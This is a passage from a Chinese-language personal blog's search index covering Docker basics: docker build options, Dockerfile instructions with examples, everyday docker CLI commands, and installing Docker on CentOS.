:忽略校验，默认开启；</span><br><span class="line">-f :指定要使用的Dockerfile路径；</span><br><span class="line">--force-rm :设置镜像过程中删除中间容器；</span><br><span class="line">--isolation :使用容器隔离技术；</span><br><span class="line">--label&#x3D;[] :设置镜像使用的元数据；</span><br><span class="line">-m :设置内存最大值；</span><br><span class="line">--memory-swap :设置Swap的最大值为内存+swap，&quot;-1&quot;表示不限swap；</span><br><span class="line">--no-cache :创建镜像的过程不使用缓存；</span><br><span class="line">--pull :尝试去更新镜像的新版本；</span><br><span class="line">--quiet, -q :安静模式，成功后只输出镜像 ID；</span><br><span class="line">--rm :设置镜像成功后删除中间容器；</span><br><span class="line">--shm-size :设置&#x2F;dev&#x2F;shm的大小，默认值是64M；</span><br><span class="line">--ulimit :Ulimit配置。</span><br><span class="line">--tag, -t: 镜像的名字及标签，通常 name:tag 或者 name 格式；可以在一次构建中为一个镜像设置多个标签。</span><br><span class="line">--network: 默认 default。在构建期间设置RUN指令的网络模式</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">举例：</span><br><span class="line">1. 使用当前目录的 Dockerfile 创建镜像，标签为 runoob&#x2F;ubuntu:v1</span><br><span class="line">docker build -t runoob&#x2F;ubuntu:v1 .</span><br><span class="line"></span><br><span class="line">2. 使用URL github.com&#x2F;creack&#x2F;docker-firefox 的 Dockerfile 创建镜像。</span><br><span class="line">docker build github.com&#x2F;creack&#x2F;docker-firefox</span><br><span class="line"></span><br><span class="line">3. 也可以通过 -f Dockerfile 文件的位置：</span><br><span class="line">docker build -f &#x2F;path&#x2F;to&#x2F;a&#x2F;Dockerfile .</span><br></pre></td></tr></table></figure><h2 id="命令详解"><a href="#命令详解" class="headerlink" title="命令详解"></a>命令详解</h2><h3 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">指定哪种镜像作为新镜像的基础镜像，如：</span><br><span class="line">FROM ubuntu:14.04</span><br></pre></td></tr></table></figure><h3 id="MAINTAINER"><a href="#MAINTAINER" class="headerlink" title="MAINTAINER"></a>MAINTAINER</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">指明该镜像的作者和其电子邮件，如：</span><br><span class="line">MAINTAINER vector4wang &quot;xxxxxxx@qq.com&quot;</span><br></pre></td></tr></table></figure><h3 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">设置环境变量 (可以写多条)</span><br><span class="line">ENV key value</span><br></pre></td></tr></table></figure><h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在新镜像内部执行的命令，比如安装一些软件、配置一些基础环境，可使用\来换行，如：</span><br><span class="line">RUN echo &#39;hello docker!&#39; \</span><br><span class="line">    &gt; &#x2F;usr&#x2F;local&#x2F;file.txt</span><br><span class="line"></span><br><span class="line">也可以使用exec格式RUN [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;]的命令，如：</span><br><span class="line">RUN [&quot;apt-get&quot;,&quot;install&quot;,&quot;-y&quot;,&quot;nginx&quot;]</span><br></pre></td></tr></table></figure><h3 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">将主机的文件复制到镜像内，如果目的位置不存在，Docker会自动创建所有需要的目录结构：</span><br><span class="line">COPY source_dir&#x2F;file dest_dir&#x2F;file</span><br><span class="line">注意：</span><br><span class="line">1. 需要复制的目录一定要放在Dockerfile文件的同级目录下</span><br><span class="line">2. 因为构建环境将会上传到Docker守护进程，而复制是在Docker守护进程中进行的。任何位于构建环境之外的东西都是不可用的。COPY指令的目的的位置则必须是容器内部的一个绝对路径。</span><br><span class="line">3. 如果有压缩文件并不能解压</span><br></pre></td></tr></table></figure><h3 id="ADD"><a href="#ADD" class="headerlink" title="ADD"></a>ADD</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将主机的文件复制到镜像中，跟COPY一样，限制条件和使用方式都一样，如：</span><br><span class="line">ADD source_dir&#x2F;file dest_dir&#x2F;file</span><br><span class="line">ADD会对压缩文件（tar, gzip, bzip2, etc）做提取和解压操作。</span><br></pre></td></tr></table></figure><h3 id="EXPOSE"><a href="#EXPOSE" class="headerlink" title="EXPOSE"></a>EXPOSE</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">暴露镜像的端口供主机做映射，启动镜像时，使用-P参数来讲镜像端口与宿主机的随机端口做映射。可指定多个：</span><br><span class="line">EXPOSE 8080</span><br><span class="line">EXPOSE 8081</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="WORKDIR"><a href="#WORKDIR" class="headerlink" title="WORKDIR"></a>WORKDIR</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在构建镜像时，指定镜像的工作目录，之后的命令都是基于此工作目录，如果不存在，则会创建目录。如：</span><br><span class="line">WORKDIR &#x2F;usr&#x2F;local</span><br><span class="line">WORKDIR webservice</span><br><span class="line">RUN echo &#39;hello docker&#39; &gt; text.txt</span><br><span class="line">...</span><br><span class="line">最终会在&#x2F;usr&#x2F;local&#x2F;webservice&#x2F;目录下生成text.txt文件</span><br></pre></td></tr></table></figure><h3 id="ONBUILD"><a href="#ONBUILD" class="headerlink" title="ONBUILD"></a>ONBUILD</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">当一个包含ONBUILD命令的镜像被用作其他镜像的基础镜像时，</span><br><span class="line">(比如用户的镜像需要从某为准备好的位置添加源代码，或者用户需要执行特定于构建镜像的环境的构建脚本)，该命令就会执行。</span><br><span class="line"></span><br><span class="line">如创建镜像image-A：</span><br><span class="line">FROM ubuntu</span><br><span class="line">...</span><br><span class="line">ONBUILD ADD . &#x2F;var&#x2F;www</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">然后创建镜像image-B，指定image-A为基础镜像，如：</span><br><span class="line">FROM image-A</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">然后在构建image-B的时候，日志上显示如下:</span><br><span class="line">Step 0 : FROM image-A</span><br><span class="line"># Execting 1 build triggers</span><br><span class="line">Step onbuild-0 : ADD . &#x2F;var&#x2F;www</span><br></pre></td></tr></table></figure><h3 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">指定该镜像以什么样的用户去执行，如：</span><br><span class="line">USER mongo</span><br></pre></td></tr></table></figure><h3 id="VOLUME"><a href="#VOLUME" class="headerlink" title="VOLUME"></a>VOLUME</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用来向基于镜像创建的容器添加卷。比如你可以将mongodb镜像中存储数据的data文件指定为主机的某个文件。(容器内部建议不要存储任何数据)</span><br><span class="line">如：</span><br><span class="line">VOLUME &#x2F;data&#x2F;db &#x2F;data&#x2F;configdb</span><br><span class="line">注意:VOLUME 主机目录 容器目录</span><br></pre></td></tr></table></figure><p>注意：一般直接 VOLUME 容器目录<br>因为挂载会出现问题<br>然后docker启动容器的时候再加上 -v 参数以映射，详见docker.md</p><h3 id="CMD-与-ENTRYPOINT"><a href="#CMD-与-ENTRYPOINT" class="headerlink" title="CMD 与 ENTRYPOINT"></a>CMD 与 ENTRYPOINT</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">CMD与ENTRYPOINT作用与用法一样：</span><br><span class="line">都是在容器启动时需要执行的命令，如：</span><br><span class="line">CMD &#x2F;bin&#x2F;bash</span><br><span class="line">ENTRYPOINT &#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">同样可以使用exec语法，如：</span><br><span class="line">CMD [&quot;&#x2F;bin&#x2F;bash&quot;]</span><br><span class="line">当有多个CMD的时候，只有最后一个生效。</span><br><span class="line"></span><br><span class="line">但两者拥有很大的区别：</span><br><span class="line">1. CMD的命令会被 docker run 的命令覆盖而ENTRYPOINT不会</span><br><span class="line">&gt; 如使用CMD [&quot;&#x2F;bin&#x2F;bash&quot;]或ENTRYPOINT [&quot;&#x2F;bin&#x2F;bash&quot;]后，再使用docker run -ti image启动容器，如同使用：</span><br><span class="line">docker run -ti image &#x2F;bin&#x2F;bash</span><br><span class="line">&#x2F;bin&#x2F;bash：容器启动以后，内部第一个执行的命令。这里是启动 Bash，保证用户可以使用 Shell。</span><br><span class="line"></span><br><span class="line">但是如果启动镜像的命令为docker run -ti image &#x2F;bin&#x2F;ps，使用CMD后面的命令就会被覆盖转而执行bin&#x2F;ps命令，而ENTRYPOINT的则不会，而是会把 docker run 后面的命令当做ENTRYPOINT&lt;font color&#x3D;&quot;FF0000&quot;&gt;执行命令的参数&lt;&#x2F;font&gt;。</span><br><span class="line"></span><br><span class="line">以下例子比较容易理解</span><br><span class="line">Dockerfile中</span><br><span class="line">ENTRYPOINT [&quot;&#x2F;user&#x2F;sbin&#x2F;nginx&quot;]</span><br><span class="line"></span><br><span class="line">然后通过启动build之后的容器</span><br><span class="line">docker run -ti image -g &quot;daemon off&quot;</span><br><span class="line"></span><br><span class="line">此时-g &quot;daemon off&quot;会被当成参数传递给ENTRYPOINT，最终的命令变成了</span><br><span class="line">&#x2F;user&#x2F;sbin&#x2F;nginx -g &quot;daemon off&quot;</span><br><span class="line"></span><br><span class="line">CMD和ENTRYPOINT都存在时，CMD的指令变成了ENTRYPOINT的参数，并且此CMD提供的参数会被 docker run 后面的命令覆盖，如：</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">ENTRYPOINT [&quot;echo&quot;,&quot;hello&quot;,&quot;i am&quot;]</span><br><span class="line">CMD [&quot;docker&quot;]</span><br><span class="line">之后启动构建之后的容器</span><br><span class="line"></span><br><span class="line">使用docker run -ti image</span><br><span class="line">输出“hello i am docker”</span><br><span class="line"></span><br><span class="line">使用docker run -ti image world</span><br><span class="line">输出“hello i am world”</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Basic Component </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How To Use Docker</title>
      <link href="/2019/08/11/How-To-Use-Docker/"/>
      <url>/2019/08/11/How-To-Use-Docker/</url>
      
        <content type="html"><![CDATA[<h6 id="help"><a href="#help" class="headerlink" title="help"></a>help</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 比如：</span><br><span class="line">docker run --help</span><br></pre></td></tr></table></figure><h6 id="login"><a href="#login" class="headerlink" title="login"></a>login</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># docker后台登陆</span><br><span class="line"># 注意，账号不是邮箱地址</span><br><span class="line">docker login</span><br></pre></td></tr></table></figure><h6 id="search"><a href="#search" class="headerlink" title="search"></a>search</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#  查看仓库里有些什么镜像</span><br><span class="line">docker search jenkins</span><br><span class="line"></span><br><span class="line"># 默认从docker hub搜寻，镜像名称前面会默认加上 docker.io&#x2F;</span><br><span class="line"># 当然也可以找其他常见的，如 mysql, tomcat, nginx 等等。</span><br><span class="line"></span><br><span class="line"># NAME：镜像的仓库名</span><br><span class="line"># DESCRIPTION：镜像描述</span><br><span class="line"># STARS：用户评价，即用户欢迎程度</span><br><span class="line"># OFFICIAL：是否官方</span><br></pre></td></tr></table></figure><h6 id="pull"><a href="#pull" class="headerlink" title="pull"></a>pull</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 拉取镜像到本地，如果不加版本默认会下载latest版本</span><br><span class="line">docker pull 镜像名:版本</span><br></pre></td></tr></table></figure><h6 id="push"><a href="#push" class="headerlink" title="push"></a>push</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 推送镜像到hub</span><br><span class="line">docker push 镜像名:版本</span><br></pre></td></tr></table></figure><h6 id="run-与-参数"><a href="#run-与-参数" class="headerlink" title="run 与 参数"></a>run 与 参数</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 创建容器</span><br><span class="line">docker run -dit --rm --privileged&#x3D;true\ </span><br><span class="line">-p21:21 -p9010:9010 -p8080:8080 -p30000-30010:30000-30010\</span><br><span class="line">--name how2jtmall how2j&#x2F;tmall:latest &#x2F;usr&#x2F;sbin&#x2F;init</span><br><span class="line"></span><br><span class="line"># 1. docker run 表示运行一个镜像</span><br><span class="line"># 2. -dit 是 -d -i -t 的缩写。 -d ，表示 detach，即在后台运行。 -i 表示提供交互接口，这样才可以通过 docker 和 跑起来的操作系统交互。-t 表示提供一个 tty (伪终端)，与 -i 配合就可以通过 ssh 工具连接到这个容器里面去了</span><br><span class="line"># 3. --rm 表示在容器终止运行后自动删除容器文件，或者如果容器已经存在了，自动删除容器</span><br><span class="line"># 4. --privileged 启动容器的时候，把权限带进去。这样才可以在容器里进行完整的操作</span><br><span class="line"># 5. -p21:21 第一个21，表示在CentOS上开放21端口。第二个21表示在容器里开放21端口。 这样当访问CentOS 的21端口的时候，就会间接地访问到容器里了。</span><br><span class="line"># 6. -p9010:9010 和 21一个道理</span><br><span class="line"># 7. -p8080:8080 和 21 一个道理，tomcat端口</span><br><span class="line"># 8. -p30000-30010 和21也是一个道理，这个是ftp用来传输数据的</span><br><span class="line"># 9. --name how2jtmall 给容器取了个名字，叫做 how2jtmall，方便后续管理</span><br><span class="line"># 10. how2j&#x2F;tmall:latest how2j&#x2F;tmall就是镜像的名称， latest是版本号，即最新版本</span><br><span class="line"># 11. &#x2F;usr&#x2F;sbin&#x2F;init: 表示启动后运行的程序，即通过这个命令做初始化</span><br><span class="line"># 12. -v 表示目录映射关系（前者是宿主机目录，后者是映射到宿主机上的目录），可以使用多个－v做多个目录或文件映射。</span><br><span class="line"># 13. -e 表示添加容器的环境变量</span><br></pre></td></tr></table></figure><h6 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 进入容器，进去之后，就可以像操作一个普通 linux 那样操作了</span><br><span class="line">docker exec -it how2jtmall &#x2F;bin&#x2F;bash</span><br><span class="line"># 输入 exit 退出容器</span><br></pre></td></tr></table></figure><h6 id="images"><a href="#images" class="headerlink" title="images"></a>images</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 查看本地有些什么镜像</span><br><span class="line">docker images</span><br><span class="line"># REPOSITORY：镜像名称</span><br><span class="line"># TAG：镜像标签</span><br><span class="line"># IMAGE ID：镜像ID</span><br><span class="line"># CREATED：镜像的创建日期（不是获取该镜像的日期）</span><br><span class="line"># SIZE：镜像大小</span><br></pre></td></tr></table></figure><h6 id="rmi"><a href="#rmi" class="headerlink" title="rmi"></a>rmi</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 删除本地镜像</span><br><span class="line">docker rmi docker.io&#x2F;tomcat:8.0</span><br><span class="line"># 有容器的情况下需要先删除容器</span><br><span class="line"># 如果需要一次性删除全部镜像</span><br><span class="line">docker rmi $(docker images -q)</span><br></pre></td></tr></table></figure><h6 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 对容器做了修改后，把改动后的容器，再次转换为镜像。</span><br><span class="line">docker commit 容器名 保存的镜像名</span><br></pre></td></tr></table></figure><h6 id="生命周期管理"><a href="#生命周期管理" class="headerlink" title="生命周期管理"></a>生命周期管理</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">暂停：pause</span><br><span class="line">恢复：unpause</span><br><span class="line">停止：stop</span><br><span class="line">开始：start</span><br></pre></td></tr></table></figure><h6 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps     查看正在运行的容器</span><br><span class="line">docker ps –a  查看所有的容器</span><br><span class="line">docker ps -a --filter status&#x3D;dead --filter status&#x3D;exited --last 1 # 找出最近运行失败的Docker容器</span><br></pre></td></tr></table></figure><h6 id="inspect"><a href="#inspect" class="headerlink" title="inspect"></a>inspect</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 检查容器具体内容</span><br><span class="line">docker inspect 容器名或id</span><br><span class="line"></span><br><span class="line"># 该命令获取两个主要响应：镜像级别的详细信息和容器级别的详细信息。</span><br><span class="line"># 1. 容器ID以及创建的时间戳</span><br><span class="line"># 2. 当前状态（在尝试识别容器是否已停止以及为何停止时很有用）</span><br><span class="line"># 3. Docker镜像信息、文件系统绑定、卷信息以及挂载</span><br><span class="line"># 4. 环境变量，例如传递给容器的命令行参数</span><br><span class="line"># 5. 网络配置：IPv4和IPv6的IP地址以及网关和辅助地址</span><br></pre></td></tr></table></figure><h6 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 删除容器</span><br><span class="line">docker rm 容器名&#x2F;id</span><br><span class="line"># 删除所有容器</span><br><span class="line">docker rm -f $(docker ps -a -q)</span><br></pre></td></tr></table></figure><h6 id="tag"><a href="#tag" class="headerlink" title="tag"></a>tag</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 通过tag可以对镜像进行标记</span><br><span class="line">docker tag [imageName] [username]&#x2F;[repository]:[tag]</span><br><span class="line">docker tag docker.io&#x2F;tomcat:8.0 docker.io&#x2F;mytomcat:8.0</span><br><span class="line"># 然后docker images，会发现上面两个镜像都拥有同样的imageid</span><br></pre></td></tr></table></figure><h6 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 拷贝文件</span><br><span class="line">docker cp 需要拷贝的文件或目录容器名称:容器目录-&gt;把宿主机的文件拷贝到容器里</span><br><span class="line">docker cp 容器名称:容器目录需要拷贝的文件或目录-&gt;从容器中拷贝文件到宿主机</span><br></pre></td></tr></table></figure><h6 id="save-amp-load"><a href="#save-amp-load" class="headerlink" title="save &amp; load"></a>save &amp; load</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 备份：备份的作用在于保留一个版本的镜像。</span><br><span class="line">docker save –o 打包的后的文件名.tar 镜像名</span><br><span class="line"># 恢复：假如我们对修改运行一段时间后的容器不满意，想要回到最初的状态，这时我们就可以删除现在的容器和镜像，然后恢复备份的镜像，直接run。</span><br><span class="line">docker rm 你要删除的镜像名或者id</span><br><span class="line">docker load –i 你的备份镜像tar包</span><br></pre></td></tr></table></figure><h6 id="logs"><a href="#logs" class="headerlink" title="logs"></a>logs</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看容器运行日志</span><br><span class="line">docker logs 容器id</span><br></pre></td></tr></table></figure><h6 id="history"><a href="#history" class="headerlink" title="history"></a>history</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查看镜像build历史</span><br><span class="line">docker history 镜像id</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Basic Component </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker Introduction</title>
      <link href="/2019/08/10/Docker-Introduction/"/>
      <url>/2019/08/10/Docker-Introduction/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://docs.docker.com/" target="_blank" rel="noopener">Docker文档</a> | <a href="https://hub.docker.com/" target="_blank" rel="noopener">DockerHub</a></p></blockquote><h2 id="Docker-原理"><a href="#Docker-原理" class="headerlink" title="Docker 原理"></a>Docker 原理</h2><blockquote><p>所谓的镜像，就是持久化后的，安装了各种工具，软件和服务的一个Linux 操作系统。<br>Docker 属于 Linux 容器的一种封装，提供简单易用的容器使用接口。</p></blockquote><h3 id="Docker-特点"><a href="#Docker-特点" class="headerlink" title="Docker 特点"></a>Docker 特点</h3><ol><li>文件系统隔离：每个不同的容器都存在不同的独立文件系统中</li><li>资源隔离：每个容器都有自己独立的ip，网络和虚拟接口</li><li>日志记录：Docker将会收集和记录每个进程容器的标准流（stdout/stderr/stdin），用于实时检索和批量检索</li></ol><h3 id="三类主要用途"><a href="#三类主要用途" class="headerlink" title="三类主要用途"></a>三类主要用途</h3><p>（1）提供一次性的环境。比如，本地测试他人的软件、持续集成的时候提供单元测试和构建的环境。<br>（2）提供弹性的云服务。因为 Docker 容器可以随开随关，很适合动态扩容和缩容。<br>（3）组建微服务架构。通过多个容器，一台机器可以跑多个服务，因此在本机就可以模拟出微服务架构。</p><h3 id="Docker-术语"><a href="#Docker-术语" class="headerlink" title="Docker 术语"></a>Docker 术语</h3><p>仓库： 别人做好的现成的镜像，都放在仓库里<br>镜像： 自己要用哪个镜像，就先拉到本地来。镜像就相当于还没激活的容器。</p><blockquote><p>Docker 把应用程序及其依赖，打包在 image 文件里面。只有通过这个文件，才能生成 Docker 容器。image 文件可以看作是容器的模板。Docker 根据 image 文件生成容器的实例。同一个 image 文件，可以生成多个同时运行的容器实例。<br>image 是二进制文件。实际开发中，一个 image 文件往往通过继承另一个 image 文件，加上一些个性化设置而生成。</p></blockquote><p>容器： 容器就是跑起来的镜像，就是一个完整的工作环境</p><blockquote><p>image 文件生成的容器实例，本身也是一个文件，称为容器文件。也就是说，一旦容器生成，就会同时存在两个文件： image 文件和容器文件。而且关闭容器并不会删除容器文件，只是容器停止运行而已。</p></blockquote><h2 id="安装-Docker"><a href="#安装-Docker" class="headerlink" title="安装 Docker"></a>安装 Docker</h2><h3 id="Centos-yum-安装"><a href="#Centos-yum-安装" class="headerlink" title="Centos yum 安装"></a>Centos yum 安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 1. 移除旧版本docker</span><br><span class="line">yum remove docker \</span><br><span class="line">    docker-client \</span><br><span class="line">    docker-client-latest \</span><br><span class="line">    docker-common \</span><br><span class="line">    docker-latest \</span><br><span class="line">    docker-latest-logrotate \</span><br><span class="line">    docker-logrotate \</span><br><span class="line">    docker-selinux \</span><br><span class="line">    docker-engine-selinux \</span><br><span class="line">    docker-engine</span><br><span class="line"></span><br><span class="line"># 2. 更新yum</span><br><span class="line">yum -y update</span><br><span class="line"></span><br><span class="line"># 3. 安装常用工具</span><br><span class="line">yum install iproute ftp bind-utils net-tools wget yum-utils device-mapper-persistent-data lvm2 -y</span><br><span class="line"></span><br><span class="line"># 4. 安装Docker</span><br><span class="line">yum install docker -y</span><br><span class="line"></span><br><span class="line"># 5. 查看是否安装成功</span><br><span class="line">docker -v</span><br><span class="line">docker info</span><br></pre></td></tr></table></figure><h3 id="启停Docker"><a href="#启停Docker" class="headerlink" title="启停Docker"></a>启停Docker</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker.service</span><br><span class="line">systemctl status docker.service</span><br><span class="line">systemctl stop docker.service</span><br><span class="line">systemctl restart docker.service</span><br></pre></td></tr></table></figure><h3 id="虚拟机里安装Docker注意事项"><a href="#虚拟机里安装Docker注意事项" class="headerlink" title="虚拟机里安装Docker注意事项"></a>虚拟机里安装Docker注意事项</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">运行</span><br><span class="line">nslookup www.baidu.com</span><br><span class="line">若显示局域网地址，则代表需要进行之后步骤</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">把它改为公用的域名服务器地址</span><br><span class="line">vi &#x2F;etc&#x2F;resolv.conf</span><br><span class="line"></span><br><span class="line"># Generated by NetworkManager</span><br><span class="line">search www.tendawifi.com</span><br><span class="line">nameserver 119.29.29.29</span><br><span 